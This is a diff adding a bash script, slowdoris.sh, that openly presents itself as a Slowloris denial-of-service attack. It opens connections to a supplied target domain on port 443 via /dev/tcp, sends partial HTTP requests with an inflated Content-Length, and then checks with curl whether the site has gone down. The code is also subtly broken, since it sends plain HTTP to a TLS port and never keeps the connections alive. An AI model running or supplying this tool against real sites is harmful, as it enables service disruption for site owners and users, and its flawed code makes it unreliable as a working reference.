@@ -1,0 +1,68 @@
+#!/bin/bash
+
+# Usage check
+if [ -z "$1" ]; then
+    echo "Usage: ./slowdoris.sh <target-domain>"
+    exit 1
+fi
+
+# Assigning the target domain
+TARGET=$1
+
+# Number of connections to open (adjustable)
+MAX_CONNECTIONS=50
+MAX_CONCURRENT=10  # Limit concurrent connections to prevent system overload
+
+# Function to send Slowloris attack requests
+send_slowloris_attack() {
+    local conn_id=$1
+    exec 3<>/dev/tcp/$TARGET/443
+    echo -ne "GET / HTTP/1.1\r\nHost: $TARGET\r\n" >&3
+    echo -ne "Content-Length: 100000\r\n" >&3
+    echo -ne "\r\n" >&3
+
+    # Logging opened connection
+    echo "Connection $conn_id opened."
+}
+
+# Function to manage concurrent connections
+manage_connections() {
+    local conn_count=0
+    while [ $conn_count -lt $MAX_CONNECTIONS ]; do
+        # Launch the send_slowloris_attack function in the background
+        send_slowloris_attack $conn_count &
+        conn_count=$((conn_count + 1))
+
+        # If the number of background processes exceeds MAX_CONCURRENT, wait for one to finish
+        if [ $(jobs -r | wc -l) -ge $MAX_CONCURRENT ]; then
+            wait -n
+        fi
+
+        # Throttle connections to avoid hitting resource limits
+        sleep 0.5
+    done
+
+    # Wait for all background processes to finish
+    wait
+}
+
+# Create and maintain multiple connections
+echo "Starting Slowloris attack on $TARGET..."
+manage_connections
+
+# Check server responsiveness after initiating the attack
+echo "Checking server responsiveness after initiating the attack..."
+sleep 5  # Wait a moment for connections to establish
+
+# Using curl to check server status
+SERVER_STATUS=$(curl -s -o /dev/null -w "%{http_code}" https://$TARGET)
+
+# Check if the server is still responsive
+if [ "$SERVER_STATUS" -eq 200 ]; then
+    echo "The target $TARGET is still responsive. Slowloris attack might not have been successful."
+else
+    echo "The target $TARGET might have been affected. Status code: $SERVER_STATUS"
+fi
+
+echo "Slowloris attack completed. Exiting..."
+exit 0
